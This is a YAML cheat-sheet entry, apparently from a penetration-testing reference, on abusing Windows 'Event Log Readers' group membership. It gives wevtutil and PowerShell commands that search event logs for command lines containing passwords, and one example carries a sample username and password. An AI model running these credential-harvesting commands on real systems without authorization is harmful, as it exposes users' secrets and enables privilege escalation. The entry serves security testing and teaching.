---
description: |
  This guide demonstrates how to enumerate and abuse Event Log Readers group membership on Windows to access event logs and extract sensitive information. It covers confirming group membership, querying event logs for credentials, and using built-in tools to search for process command lines containing passwords. These steps are useful for privilege escalation and credential harvesting.

command: |
  net localgroup "Event Log Readers"

code: |
  # Query Security event log for process command lines (using wevtutil)
  wevtutil qe Security /rd:true /f:text | findstr "CommandLine"

  # Query Security event log with alternate credentials
  wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "CommandLine"

  # Search for process creation events (4688) with Get-WinEvent (PowerShell)
  Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4688 } | ForEach-Object {
    $_.Properties | Where-Object { $_.Value -like "*password*" }
  }

  # PowerShell Operational log may also contain credentials if script block logging is enabled:
  Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Select-Object -ExpandProperty Message | findstr /i "password"

items:
  -
services:
  -
OS:
  - Windows
attack_types:
  - Enumeration
  - PrivEsc
references:
  - https://www.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/token-privileges
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment
  - https://learn.microsoft.com/en-us/windows/security/threat-
---